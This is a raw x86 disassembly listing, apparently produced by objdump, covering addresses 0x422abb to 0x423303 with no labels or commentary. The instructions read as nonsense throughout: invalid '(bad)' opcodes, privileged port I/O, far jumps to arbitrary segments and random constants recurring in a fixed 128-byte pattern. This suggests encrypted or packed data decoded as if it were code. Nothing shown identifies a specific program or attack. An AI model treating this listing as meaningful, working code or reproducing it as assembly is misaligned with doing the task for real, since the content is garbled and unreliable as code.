  422abb:	test   BYTE PTR [ebx-0x6d],dh
  422abe:	xchg   edx,eax
  422abf:	mov    eax,0x2ccffa18
  422ac4:	add    DWORD PTR [eax],0x0
	...
  422acf:	add    BYTE PTR [eax],al
  422ad1:	add    BYTE PTR [edi-0x28db29d],bl
  422ad7:	jle    0x422a98
  422ad9:	out    dx,eax
  422ada:	sbb    edi,esp
  422adc:	mov    BYTE PTR [ecx+ebx*8+0x606a4cef],dh
  422ae3:	rol    DWORD PTR [ecx],1
  422ae5:	add    BYTE PTR [ebx+0x0],bl
  422ae8:	add    BYTE PTR [eax],al
  422aea:	pop    ebx
  422aeb:	mov    ebp,0xfda7cc01
  422af0:	test   eax,0x1b890c29
  422af5:	sbb    edi,ecx
  422af7:	inc    ecx
  422af8:	sub    eax,0xc0c621d1
  422afd:	add    dl,BYTE PTR [ebx+0x148ba784]
  422b03:	add    edi,edi
  422b05:	mov    ebp,0xa93b6e28
  422b0a:	and    ecx,DWORD PTR [esi]
  422b0c:	push   ss
  422b0d:	into   
  422b0e:	sar    DWORD PTR [ebx],0x66
  422b11:	ja     0x422acf
  422b13:	cli    
  422b14:	mov    ds:0xbce442bb,eax
  422b19:	cdq    
  422b1a:	data16 sub BYTE PTR [esi-0x4b],ch
  422b1e:	outs   dx,DWORD PTR ds:[esi]
  422b1f:	push   DWORD PTR [ecx-0x7a78d486]
  422b25:	jp     0x422afc
  422b27:	lahf   
  422b28:	dec    BYTE PTR [eax-0x5f]
  422b2b:	in     al,0xb4
  422b2d:	push   ebx
  422b2e:	mov    eax,0x5a9da34a
  422b33:	xchg   esi,eax
  422b34:	and    esi,edx
  422b36:	dec    edx
  422b37:	and    dh,BYTE PTR [eax-0x79]
  422b3a:	fneni(8087 only) 
  422b3c:	pusha  
  422b3d:	dec    edx
  422b3e:	repz mov al,ds:0xa23e49ff
  422b44:	pop    edx
	...
  422b51:	add    BYTE PTR [eax+0x23],dh
  422b54:	and    eax,0x7c6f7769
  422b59:	cmp    esp,DWORD PTR [eax+0x3ebcee1c]
  422b5f:	scas   al,BYTE PTR es:[edi]
  422b60:	mov    es,edx
  422b62:	mov    ebx,0x5b0001d1
  422b67:	add    BYTE PTR [eax],al
  422b69:	add    BYTE PTR [esi-0x4751f950],bh
  422b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b70:	das    
  422b71:	or     al,0xa1
  422b73:	xchg   esi,eax
  422b74:	pop    es
  422b75:	dec    ecx
  422b76:	cs int 0x81
  422b79:	mov    cl,BYTE PTR [esi-0x31f52e5d]
  422b7f:	das    
  422b80:	out    0x57,al
  422b82:	cli    
  422b83:	repz popf 
  422b85:	sub    eax,0xeff592c6
  422b8a:	mov    bh,0x9a
  422b8c:	sub    dl,BYTE PTR [esi]
  422b8e:	loope  0x422c0f
  422b90:	pushf  
  422b91:	sbb    BYTE PTR [edi-0x17e06901],bl
  422b97:	mov    ds,WORD PTR [ebp+0x6]
  422b9a:	pop    ds
  422b9b:	mov    WORD PTR [edx-0x29],ds
  422b9e:	push   0x41
  422ba0:	aad    0x4f
  422ba2:	pop    edi
  422ba3:	jp     0x422b38
  422ba5:	cmc    
  422ba6:	les    esp,FWORD PTR [esi]
  422ba8:	retf   
  422ba9:	icebp  
  422baa:	int3   
  422bab:	xor    bh,BYTE PTR [ebp-0x16]
  422bae:	mov    edx,es
  422bb0:	inc    edx
  422bb1:	cmc    
  422bb2:	in     al,0x64
  422bb4:	enter  0x1b5f,0x43
  422bb8:	pop    edi
  422bb9:	xor    eax,0x4fc27bc7
  422bbe:	out    dx,al
  422bbf:	pusha  
  422bc0:	xor    eax,0x25c4dc5c
	...
  422bd1:	add    BYTE PTR [eax+edx*4-0x32223f23],dl
  422bd8:	popf   
  422bd9:	aam    0x57
  422bdb:	(bad)
  422bdf:	mov    DWORD PTR [edx+0x1d21623],edi
  422be5:	add    BYTE PTR [ebx+0x0],bl
  422be8:	add    BYTE PTR [eax],al
  422bea:	mov    eax,0x94e3115a
  422bef:	mov    esi,0x1435ac77
  422bf4:	in     eax,0x26
  422bf6:	dec    edx
  422bf7:	and    esp,DWORD PTR ds:0x383df449
  422bfd:	call   0xb2fa:0x9ed706ba
  422c04:	lock aaa 
  422c06:	push   cs
  422c07:	(bad)  
  422c08:	mov    edx,0xa3d0eb30
  422c0d:	mov    edx,gs
  422c0f:	and    DWORD PTR [ecx+ebp*1],esi
  422c12:	add    ebx,DWORD PTR [esi]
  422c14:	mov    ds:0xfa74b476,eax
  422c19:	mov    al,0xcb
  422c1b:	cld    
  422c1c:	call   DWORD PTR [edx+0x31]
  422c1f:	mov    dh,0xf8
  422c21:	adc    eax,DWORD PTR fs:[ebx]
  422c24:	icebp  
  422c25:	addr16 stc 
  422c27:	adc    al,0xc2
  422c29:	sti    
  422c2a:	pushf  
  422c2b:	dec    edx
  422c2c:	fild   DWORD PTR [ebp*2-0x63d3233a]
  422c33:	adc    eax,0x2be087de
  422c38:	test   BYTE PTR [eax+0x3],bl
  422c3b:	xchg   esi,eax
  422c3c:	fcmovb st,st(5)
  422c3e:	lods   al,BYTE PTR ds:[esi]
  422c3f:	mov    esi,0xd127a741
  422c44:	test   eax,0x0
	...
  422c51:	add    ah,dh
  422c53:	mov    dl,0x32
  422c55:	(bad)  
  422c56:	jbe    0x422c2e
  422c58:	hlt    
  422c59:	mov    dl,0xb1
  422c5b:	and    al,0xfe
  422c5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c5e:	test   BYTE PTR [eax],ch
  422c60:	enter  0x712b,0xd2
  422c64:	add    DWORD PTR [eax],eax
  422c66:	pop    ebx
  422c67:	add    BYTE PTR [eax],al
  422c69:	add    BYTE PTR [ebx],ch
  422c6b:	ret    
  422c6c:	js     0x422bfc
  422c6e:	test   al,0x58
  422c70:	mov    BYTE PTR [ebx],al
  422c72:	inc    esi
  422c73:	cmp    BYTE PTR [ecx+0x59],cl
  422c76:	adc    eax,0xaf69103b
  422c7b:	pop    eax
  422c7c:	das    
  422c7d:	loope  0x422c22
  422c7f:	and    bh,BYTE PTR [esi]
  422c81:	or     ebx,ebx
  422c83:	jo     0x422cb6
  422c85:	cli    
  422c86:	xor    BYTE PTR [eax+eax*1+0x55],0x4a
  422c8b:	fdiv   DWORD PTR [esi]
  422c8d:	xchg   edx,eax
  422c8e:	icebp  
  422c8f:	popf   
  422c90:	sar    DWORD PTR [esi+0xdeeb9ac],0xb7
  422c97:	pop    edx
  422c98:	inc    ebx
  422c99:	iret   
  422c9a:	(bad)  
  422c9b:	pop    ebx
  422c9c:	xchg   edi,eax
  422c9d:	pop    edx
  422c9e:	xchg   DWORD PTR [edi+ebp*4],ecx
  422ca1:	ja     0x422ca5
  422ca3:	mov    dh,0xbd
  422ca5:	out    dx,eax
  422ca6:	cmp    BYTE PTR [ecx-0x64],dl
  422ca9:	shl    DWORD PTR [esi+0x24],0x55
  422cad:	imul   edi,DWORD PTR ds:0x67c6b438,0xb1678d24
  422cb7:	pop    eax
  422cb8:	xor    DWORD PTR [ecx-0x4d],0xffffffd1
  422cbc:	data16 xor dh,BYTE PTR [ebp+0x25cde67]
  422cc3:	sar    ecx,cl
	...
  422cd1:	add    BYTE PTR [edx],dh
  422cd3:	ror    esi,cl
  422cd5:	mov    ds:0xd37ebfef,al
  422cda:	sub    edi,DWORD PTR [esi]
  422cdc:	out    0x3f,eax
  422cde:	in     al,0x58
  422ce0:	jbe    0x422d1c
  422ce2:	int3   
  422ce3:	rol    BYTE PTR [ecx],cl
  422ce5:	add    BYTE PTR [ebx+0x0],bl
  422ce8:	add    BYTE PTR [eax],al
  422cea:	stc    
  422ceb:	push   0xa4168f57
  422cf0:	dec    eax
  422cf1:	xchg   edi,eax
  422cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cf4:	cmp    BYTE PTR [ebx],dh
  422cf6:	inc    ebp
  422cf7:	aad    0xd6
  422cf9:	(bad)  
  422cfa:	retf   0xc5a
  422cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cfe:	hlt    
  422cff:	retf   
  422d00:	fcmovnbe st,st(3)
  422d02:	mov    ch,0x14
  422d04:	or     BYTE PTR [ebx],bh
  422d06:	into   
  422d07:	add    eax,ebx
  422d09:	addr16 mov ecx,0x492fd69c
  422d0f:	pop    edi
  422d10:	pop    edi
  422d11:	sub    eax,0xb4adc17a
  422d16:	out    dx,al
  422d17:	in     eax,0x3a
  422d19:	push   ecx
  422d1a:	dec    ebx
  422d1b:	or     DWORD PTR [edi+0x2fe0dc7d],ecx
  422d21:	shl    DWORD PTR [ebx+0x35],1
  422d24:	push   eax
  422d25:	bswap  eax
  422d27:	es mov ah,0xbd
  422d2a:	out    dx,eax
  422d2b:	sub    DWORD PTR [ebp+edx*4-0x32],edi
  422d2f:	cwde   
  422d30:	fcom   st(0)
  422d32:	imul   edx,DWORD PTR [eax+ecx*1-0x5a],0x4c634a6b
  422d3a:	(bad)  
  422d3b:	std    
  422d3c:	in     eax,0x24
  422d3e:	and    ebp,DWORD PTR [ebx+0x75bed9eb]
  422d44:	xor    al,BYTE PTR [eax]
	...
  422d52:	fucomi st,st(5)
  422d54:	outs   dx,BYTE PTR ds:[esi]
  422d55:	and    bh,BYTE PTR [esi-0x5d]
  422d58:	(bad)  
  422d5a:	pop    esi
  422d5b:	(bad)  
  422d5c:	mov    DWORD PTR [ebp+0x1962d88e],ecx
  422d62:	daa    
  422d63:	rol    DWORD PTR [ecx],cl
  422d65:	add    BYTE PTR [ebx+0x0],bl
  422d68:	add    BYTE PTR [eax],al
  422d6a:	shl    BYTE PTR [ebx],cl
  422d6c:	or     edi,DWORD PTR [esi-0x32]
  422d6f:	cmp    eax,0xd39d7f08
  422d74:	scas   al,BYTE PTR es:[edi]
  422d75:	pop    ss
  422d76:	cmp    eax,0x61d42ad8
  422d7b:	xchg   eax,esi
  422d7d:	mov    bh,0x91
  422d7f:	repz test DWORD PTR [ebx-0x96d7950],ebx
  422d86:	stc    
  422d87:	pop    ds
  422d88:	out    0xe6,al
  422d8a:	sbb    BYTE PTR [ebp-0xa],ch
  422d8d:	and    eax,0xec276354
  422d92:	int3   
  422d93:	mov    esp,DWORD PTR ds:0x621d7ef3
  422d99:	adc    al,0x9d
  422d9b:	shl    BYTE PTR [ebx+esi*8-0x73],0xb7
  422da0:	out    0xfd,al
  422da2:	and    BYTE PTR [esi],ah
  422da4:	xor    edx,DWORD PTR [eax+ebx*1]
  422da7:	sti    
  422da8:	jl     0x422d7f
  422daa:	xchg   dh,ah
  422dac:	shl    eax,0x9
  422daf:	add    bl,BYTE PTR [edx-0x3b]
  422db2:	(bad)  
  422db3:	adc    eax,0xe492002e
  422db8:	inc    esp
  422db9:	cmp    edx,DWORD PTR [esi-0x75]
  422dbc:	retf   0xebbf
  422dbf:	sbb    al,0xf6
  422dc1:	cli    
  422dc2:	bound  edi,QWORD PTR [ebx+0x1c]
	...
  422dd1:	add    BYTE PTR ds:0x6f976b22,al
  422dd7:	(bad)  
  422dd9:	mov    dl,0x66
  422ddb:	and    BYTE PTR [esi-0x56682796],ah
  422de1:	call   0x5b:0x1d382
  422de8:	add    BYTE PTR [eax],al
  422dea:	mov    edi,DWORD PTR [eax-0x3d]
  422ded:	mov    dh,0xff
  422def:	dec    esi
  422df0:	rcr    DWORD PTR [eax],cl
  422df2:	pop    ds
  422df3:	retf   
  422df4:	(bad)  
  422df5:	shr    DWORD PTR [ebx+eiz*1-0x7781e770],1
  422dfc:	(bad)  
  422dfd:	mov    ds:0x2b7e44f0,al
  422e02:	adc    al,0x5f
  422e04:	mov    ebp,fs
  422e06:	mov    edx,0x95546438
  422e0b:	sahf   
  422e0c:	stos   BYTE PTR es:[edi],al
  422e0d:	jae    0x422e2c
  422e0f:	jnp    0x422e66
  422e11:	out    dx,eax
  422e12:	xor    cl,BYTE PTR [eax+eiz*1+0x7e170be2]
  422e19:	pop    esi
  422e1a:	cmp    edx,DWORD PTR [edx+ebp*1+0x24f97da1]
  422e21:	pop    ss
  422e22:	fisub  DWORD PTR [esi-0x6b]
  422e25:	push   esi
  422e26:	pop    eax
  422e27:	das    
  422e28:	mov    edx,edi
  422e2a:	jo     0x422e0d
  422e2c:	pop    ebx
  422e2d:	mov    bh,0xbc
  422e2f:	xor    eax,0x2d33a99c
  422e34:	fsubr  DWORD PTR [edi+0x3fe0748b]
  422e3a:	mov    esi,0xb41e45e1
  422e3f:	push   ecx
  422e40:	pop    ss
  422e41:	jno    0x422e1f
  422e43:	mov    eax,edi
	...
  422e51:	add    BYTE PTR [ebx+0x7fd924d4],cl
  422e57:	stc    
  422e58:	call   esi
  422e5a:	into   
  422e5b:	inc    ebp
  422e5c:	mov    bh,0x11
  422e5e:	inc    ebx
  422e5f:	push   ss
  422e60:	jle    0x422e71
  422e62:	fst    st(3)
  422e64:	add    DWORD PTR [eax],eax
  422e66:	pop    ebx
  422e67:	add    BYTE PTR [eax],al
  422e69:	add    BYTE PTR [ebx+ebp*1-0x4077403d],ch
  422e70:	jno    0x422eb2
  422e72:	gs sti 
  422e74:	(bad)  
  422e75:	mov    eax,ds:0x3eece85b
  422e7a:	inc    ebp
  422e7b:	sub    eax,0x58764868
  422e80:	push   ebp
  422e81:	inc    esp
  422e82:	inc    edx
  422e83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e84:	jno    0x422ef8
  422e86:	inc    ecx
  422e87:	pop    ds
  422e88:	fnstenv [esp+esi*2]
  422e8b:	cli    
  422e8c:	ins    BYTE PTR es:[edi],dx
  422e8d:	mov    ah,0xd7
  422e8f:	push   ebp
  422e90:	loope  0x422e22
  422e92:	lds    ebx,FWORD PTR [edi+ebx*4-0x75]
  422e96:	test   DWORD PTR [ebx-0x77],esi
  422e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e9a:	add    BYTE PTR [ebp-0x6a],bl
  422e9d:	mov    ds:0x32bfbf73,al
  422ea2:	iret   
  422ea3:	pop    eax
  422ea4:	mov    esp,0x53282541
  422ea9:	inc    edi
  422eaa:	pop    ds
  422eab:	sub    al,0xb0
  422ead:	in     eax,dx
  422eae:	xchg   ecx,eax
  422eaf:	not    DWORD PTR [esi-0x4c]
  422eb2:	jle    0x422f0d
  422eb4:	loope  0x422f2a
  422eb6:	sub    bl,BYTE PTR [edi+0x1496d46b]
  422ebc:	jo     0x422ec6
  422ebe:	iret   
  422ebf:	neg    ecx
  422ec1:	pop    edx
  422ec2:	cmp    eax,ebx
  422ec4:	mov    al,BYTE PTR [eax]
	...
  422ed2:	fisubr WORD PTR [ecx]
  422ed4:	cwde   
  422ed5:	sar    bh,cl
  422ed7:	repz fisubr WORD PTR ds:0x4af35f6
  422ede:	jg     0x422ec3
  422ee0:	enter  0x3832,0xd4
  422ee4:	add    DWORD PTR [eax],eax
  422ee6:	pop    ebx
  422ee7:	add    BYTE PTR [eax],al
  422ee9:	add    BYTE PTR [ebp+0x78],ch
  422eec:	or     DWORD PTR [esi+0x63],edx
  422eef:	popf   
  422ef0:	(bad)  
  422ef1:	retf   0x69c5
  422ef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ef5:	adc    eax,0xe212bfab
  422efa:	cld    
  422efb:	inc    ebp
  422efc:	enter  0xc3e5,0xbb
  422f00:	and    eax,0x683c10fe
  422f05:	cmp    bl,BYTE PTR [ebx+edi*4+0x7]
  422f09:	sub    cl,cl
  422f0b:	loop   0x422f1d
  422f0d:	inc    eax
  422f0e:	sub    DWORD PTR [edi+0x3c04d032],edx
  422f14:	sub    DWORD PTR [ebx],esp
  422f16:	inc    eax
  422f17:	dec    ebp
  422f18:	push   0xffffff90
  422f1a:	mov    bl,ah
  422f1c:	(bad)  
  422f1d:	fmul   st(4),st
  422f1f:	mov    eax,ds:0xa1bedb57
  422f24:	(bad)  [edi]
  422f26:	push   edi
  422f27:	out    dx,eax
  422f28:	pop    ebp
  422f29:	(bad)  
  422f2b:	inc    esp
  422f2c:	inc    esi
  422f2d:	push   0xffffffe8
  422f2f:	hlt    
  422f30:	push   ecx
  422f31:	sub    eax,0xe7cbd98e
  422f36:	fs loopne 0x422eda
  422f39:	inc    ebx
  422f3a:	xchg   edx,eax
  422f3b:	popa   
  422f3c:	jmp    0x427f:0xac25d677
  422f43:	mov    al,0x5b
	...
  422f51:	add    BYTE PTR [esi+0x3f],cl
  422f54:	int3   
  422f55:	sbb    eax,0x7fdffffd
  422f5a:	out    dx,eax
  422f5b:	loopne 0x422f73
  422f5d:	lods   al,BYTE PTR ds:[esi]
  422f5e:	sti    
  422f5f:	test   BYTE PTR [ebx+0x1d493b7],dl
  422f65:	add    BYTE PTR [ebx+0x0],bl
  422f68:	add    BYTE PTR [eax],al
  422f6a:	je     0x422fa6
  422f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f6d:	lds    esp,FWORD PTR [ecx-0x41]
  422f70:	push   esp
  422f71:	jne    0x422f11
  422f73:	xor    al,0xd8
  422f75:	sbb    al,0x2d
  422f77:	fimul  DWORD PTR es:[eax-0x49]
  422f7b:	sbb    bh,BYTE PTR [edi+0x62]
  422f7e:	add    bl,BYTE PTR [ebx+0x79e5eb1c]
  422f84:	in     al,dx
  422f85:	je     0x422f65
  422f87:	sar    ebx,1
  422f89:	or     DWORD PTR [ecx+0x566a1944],esi
  422f8f:	mov    WORD PTR [edi+esi*1],ss
  422f92:	test   al,0x64
  422f94:	pop    eax
  422f95:	sbb    ch,BYTE PTR [esi]
  422f97:	and    eax,0x7991fda6
  422f9c:	pop    edx
  422f9d:	mov    bl,0xc4
  422f9f:	mov    ss:0x9168e193,al
  422fa5:	push   ebp
  422fa6:	jne    0x422fc3
  422fa8:	int    0x59
  422faa:	out    dx,eax
  422fab:	inc    edi
  422fac:	push   ss
  422fad:	mov    ah,0x9b
  422faf:	inc    eax
  422fb0:	dec    edx
  422fb1:	outs   dx,BYTE PTR ds:[esi]
  422fb2:	cdq    
  422fb3:	xchg   bl,ch
  422fb5:	add    dl,BYTE PTR [ebx-0x5645e155]
  422fbb:	ins    DWORD PTR es:[edi],dx
  422fbc:	pop    esi
  422fbd:	inc    ebx
  422fbe:	in     eax,dx
  422fbf:	inc    ebp
  422fc0:	sub    edx,edi
  422fc2:	fwait
  422fc3:	push   eax
  422fc4:	pop    edi
	...
  422fd1:	add    BYTE PTR [esi],bl
  422fd3:	test   eax,0x7ff735f6
  422fd8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fde:	addr16 sti 
  422fe0:	xchg   ebx,eax
  422fe1:	cld    
  422fe2:	out    dx,al
  422fe3:	aam    0x1
  422fe5:	add    BYTE PTR [ebx+0x0],bl
  422fe8:	add    BYTE PTR [eax],al
  422fea:	pop    ds
  422feb:	nop
  422fec:	sbb    BYTE PTR [ebx+0x341823b3],0xa
  422ff3:	inc    eax
  422ff4:	adc    al,0x5c
  422ff6:	(bad)  
  422ff7:	test   al,0x6e
  422ff9:	xor    DWORD PTR [ecx-0x5e],esp
  422ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ffd:	mov    al,ds:0xea42fdbd
  423002:	cmp    al,0x57
  423004:	sbb    eax,0x1b1da8e1
  423009:	nop
  42300a:	in     eax,dx
  42300b:	push   ss
  42300c:	scas   eax,DWORD PTR es:[edi]
  42300d:	fs (bad) es:[ebx+0x31]
  423012:	inc    esi
  423013:	xchg   esi,eax
  423014:	adc    DWORD PTR [ebp-0x22],esi
  423017:	mov    dh,0x62
  423019:	fdivr  st(5),st
  42301b:	nop
  42301c:	arpl   WORD PTR [edx],si
  42301e:	(bad)  
  42301f:	ins    DWORD PTR es:[edi],dx
  423020:	xchg   BYTE PTR [eax+edi*1],ch
  423023:	push   cs
  423024:	(bad)  
  423025:	xlat   BYTE PTR ds:[ebx]
  423026:	fidiv  DWORD PTR [ebx-0x3]
  423029:	add    al,0x36
  42302b:	adc    eax,0x68d779d9
  423030:	xchg   edi,eax
  423031:	adc    esp,DWORD PTR [ecx]
  423033:	adc    ch,bl
  423035:	jmp    0x119b:0x619d5a18
  42303c:	jae    0x422fd4
  42303e:	jno    0x4230a9
  423040:	loope  0x423036
  423042:	mov    ecx,0xdc4
	...
  42304f:	add    BYTE PTR [eax],al
  423051:	add    BYTE PTR [ebx+0x7f2d6de1],bl
  423057:	lods   eax,DWORD PTR ds:[esi]
  423058:	fcomi  st,st(7)
  42305a:	sar    BYTE PTR [ebx],cl
  42305c:	(bad)  
  42305d:	add    BYTE PTR [edx-0x2e],cl
  423060:	adc    esi,DWORD PTR [eax+0x1d549]
  423066:	pop    ebx
  423067:	add    BYTE PTR [eax],al
  423069:	add    BYTE PTR [edi],ch
  42306b:	mov    ebp,0x8e0ef06e
  423070:	out    0x7d,eax
  423072:	fsubr  QWORD PTR [eax+0x57c237a3]
  423078:	aas    
  423079:	adc    dl,BYTE PTR [esp+edi*4+0x31813a5c]
  423080:	pop    edi
  423081:	in     eax,dx
  423082:	mov    DWORD PTR [edx+ecx*8-0x7240966f],esp
  423089:	xchg   esi,eax
  42308a:	and    eax,0x34173c78
  42308f:	sub    DWORD PTR [esi],eax
  423091:	dec    esi
  423092:	pushf  
  423093:	cmp    ebp,DWORD PTR [eax-0x4eef3370]
  423099:	int3   
  42309a:	jno    0x42310d
  42309c:	pop    ecx
  42309d:	iret   
  42309e:	in     eax,0x53
  4230a0:	lea    eax,[edx]
  4230a2:	pop    es
  4230a3:	mov    al,ds:0x3b5f40ce
  4230a8:	sub    ah,ah
  4230aa:	or     DWORD PTR [ebx+0x2cc883d3],edi
  4230b0:	pop    ebp
  4230b1:	push   ebp
  4230b2:	or     al,0xb6
  4230b4:	sbb    BYTE PTR [eax],bh
  4230b6:	dec    esp
  4230b7:	cs out 0x0,eax
  4230ba:	jl     0x4230a9
  4230bc:	dec    ebp
  4230bd:	jo     0x42312b
  4230bf:	call   edi
  4230c1:	push   esp
  4230c2:	shl    DWORD PTR ds:0x23,cl
	...
  4230d0:	add    BYTE PTR [eax],al
  4230d2:	or     bh,dh
  4230d4:	ja     0x423120
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
  4230dd:	dec    eax
  4230de:	lea    esi,[ebx+0x67]
  4230e1:	and    BYTE PTR [ebp+edx*8+0x5b0001],0x0
  4230e9:	add    al,cl
  4230eb:	jno    0x4230cd
  4230ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230ee:	xchg   ecx,eax
  4230ef:	leave  
  4230f0:	dec    esp
  4230f1:	sahf   
  4230f2:	fisttp WORD PTR ds:0x216fc2c6
  4230f8:	sbb    al,0xb8
  4230fa:	sbb    ecx,DWORD PTR [ecx]
  4230fc:	jne    0x423148
  4230fe:	fst    QWORD PTR [ecx-0x51a6e2f7]
  423104:	jnp    0x423124
  423106:	rcr    BYTE PTR [edi-0x74],0x2e
  42310a:	psubusw mm0,mm6
  42310d:	cmp    DWORD PTR [ebx+0x1f907103],eax
  423113:	inc    edi
  423114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423115:	stos   DWORD PTR es:[edi],eax
  423116:	add    al,0x33
  423118:	jmp    0x42313e
  42311a:	fwait
  42311b:	pop    es
  42311c:	div    BYTE PTR [edi+edx*4]
  42311f:	cli    
  423120:	ss test al,0x4
  423123:	shr    DWORD PTR [esi-0x24c1e606],1
  423129:	stc    
  42312a:	sub    al,0xf1
  42312c:	jg     0x423101
  42312e:	stos   BYTE PTR es:[edi],al
  42312f:	mov    eax,ds:0x827613db
  423134:	add    eax,0xa2edcb58
  423139:	fsubr  st,st(1)
  42313b:	add    BYTE PTR [edx-0x5236b1d0],ch
  423141:	pop    edx
  423142:	xlat   BYTE PTR ds:[ebx]
  423143:	adc    BYTE PTR [ebx],bl
	...
  423151:	add    BYTE PTR [esi],dh
  423153:	arpl   WORD PTR [eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	cli    
  42315f:	add    edi,DWORD PTR [ecx-0x7c]
  423162:	call   ebp
  423164:	add    DWORD PTR [eax],eax
  423166:	pop    ebx
  423167:	add    BYTE PTR [eax],al
  423169:	add    ah,dl
  42316b:	sub    al,0xfd
  42316d:	int    0x78
  42316f:	test   bl,al
  423171:	jmp    0xe6861b67
  423176:	mov    ebx,ecx
  423178:	repz mov esp,0x21b53dad
  42317e:	ret    
  42317f:	shr    DWORD PTR [ecx+0x5d0d6655],1
  423185:	mov    ebp,0xeca8203e
  42318a:	adc    bl,BYTE PTR [edi-0x30090158]
  423190:	sbb    eax,0xbc23ca39
  423195:	call   FWORD PTR [eax+0x415788f8]
  42319b:	mov    eax,0xc65f0c7
  4231a0:	scas   eax,DWORD PTR es:[edi]
  4231a1:	leave  
  4231a2:	stos   BYTE PTR es:[edi],al
  4231a3:	leave  
  4231a4:	clc    
  4231a5:	pusha  
  4231a6:	imul   ecx,DWORD PTR [edi],0x1d44fe3e
  4231ac:	loop   0x4231b1
  4231ae:	add    eax,0x7b6610d1
  4231b3:	dec    ebp
  4231b4:	mov    dl,BYTE PTR ds:0xd81e892d
  4231ba:	cdq    
  4231bb:	mov    eax,0xb8d3d62c
  4231c0:	xor    esi,ebx
  4231c2:	dec    ecx
  4231c3:	mov    eax,ds:0x5e
	...
  4231d0:	add    BYTE PTR [eax],al
  4231d2:	daa    
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	sub    eax,0xc02bb291
  4231e3:	fadd   QWORD PTR [ecx]
  4231e5:	add    BYTE PTR [ebx+0x0],bl
  4231e8:	add    BYTE PTR [eax],al
  4231ea:	ja     0x42322a
  4231ec:	push   esp
  4231ed:	popa   
  4231ee:	jo     0x423229
  4231f0:	rol    DWORD PTR [ecx+0x35],cl
  4231f3:	jp     0x42319c
  4231f5:	xor    dh,BYTE PTR [edx-0x3dc7ce86]
  4231fb:	pop    es
  4231fc:	inc    ebx
  4231fd:	inc    edx
  4231fe:	adc    al,0xfa
  423200:	sbb    al,0xdd
  423202:	(bad)  
  423203:	mov    ecx,0x88e96dcf
  423208:	and    bh,BYTE PTR [edi-0x64d31536]
  42320e:	std    
  42320f:	jl     0x4231cb
  423211:	add    eax,DWORD PTR [esi]
  423213:	ins    BYTE PTR es:[edi],dx
  423214:	lods   eax,DWORD PTR ds:[esi]
  423215:	cmp    BYTE PTR [edx+ebp*2+0x30351b8e],cl
  42321c:	inc    ebx
  42321d:	or     al,0xc9
  42321f:	add    ecx,DWORD PTR [ebx-0x49]
  423222:	add    eax,0x6b56a021
  423227:	rol    BYTE PTR [ecx-0x1160d47c],cl
  42322d:	mov    ah,0xc6
  42322f:	mov    esp,0xca9a0132
  423234:	cmp    eax,0xd2934c45
  423239:	and    al,0xd9
  42323b:	lahf   
  42323c:	mov    dh,0x8c
  42323e:	add    cl,BYTE PTR [ecx+edi*1+0x59507eaf]
	...
  423251:	add    BYTE PTR [edi],ah
  423253:	ss lahf 
  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0x5dfd075b
  423260:	jne    0x423236
  423262:	sbb    ebx,ebp
  423264:	add    DWORD PTR [eax],eax
  423266:	pop    ebx
  423267:	add    BYTE PTR [eax],al
  423269:	add    BYTE PTR [esi-0x5a336d5f],dh
  42326f:	retf   0xb700
  423272:	ss stos DWORD PTR es:[edi],eax
  423274:	add    BYTE PTR [edx],cl
  423276:	xchg   ebx,eax
  423277:	hlt    
  423278:	mov    DWORD PTR [eax+0x1d],ecx
  42327b:	mov    eax,ds:0x309c54e5
  423280:	repz jo 0x4232bb
  423283:	mov    al,0x5b
  423285:	dec    ebp
  423286:	lds    ebp,FWORD PTR [ecx+0x237586]
  42328c:	popf   
  42328d:	loopne 0x42330b
  42328f:	leave  
  423290:	jb     0x423222
  423292:	jno    0x42327c
  423294:	(bad)  
  423295:	les    edi,FWORD PTR [esi-0x5e]
  423298:	inc    ebx
  423299:	cmp    eax,0xf6e4f17b
  42329e:	xchg   ebx,eax
  42329f:	call   0x5ef30964
  4232a4:	jo     0x42323a
  4232a6:	adc    edi,DWORD PTR [edx-0x16]
  4232a9:	mov    cl,0x0
  4232ab:	push   edx
  4232ac:	lods   al,BYTE PTR ds:[esi]
  4232ad:	add    eax,0xc1d8d2e7
  4232b2:	retf   0xb8cf
  4232b5:	mov    BYTE PTR [esi+0x45e7b3f5],bl
  4232bb:	sub    DWORD PTR [ebx-0x25],esi
  4232be:	(bad)  
  4232bf:	mov    BYTE PTR [ebx],dh
  4232c1:	pop    esi
  4232c2:	xor    bh,0xea
	...
  4232d1:	add    BYTE PTR [edi],dh
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0x1eac:0x3699eef4
  4232e2:	jbe    0x4232c1
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	pop    ebx
  4232e7:	add    BYTE PTR [eax],al
  4232e9:	add    BYTE PTR [ebp-0xf891f4e],al
  4232ef:	xchg   edx,eax
  4232f0:	inc    ebx
  4232f1:	clc    
  4232f2:	push   edx
  4232f3:	pusha  
  4232f4:	pop    esi
  4232f5:	mov    ch,0xba
  4232f7:	popa   
  4232f8:	scas   al,BYTE PTR es:[edi]
  4232f9:	inc    ebx
  4232fa:	push   cs
  4232fb:	add    al,BYTE PTR [ebx]
  4232fd:	loopne 0x423333
  4232ff:	mov    DWORD PTR [edx+ecx*1-0x22],esp
  423303:	fild   DWORD PTR [ecx+0xca8f197]
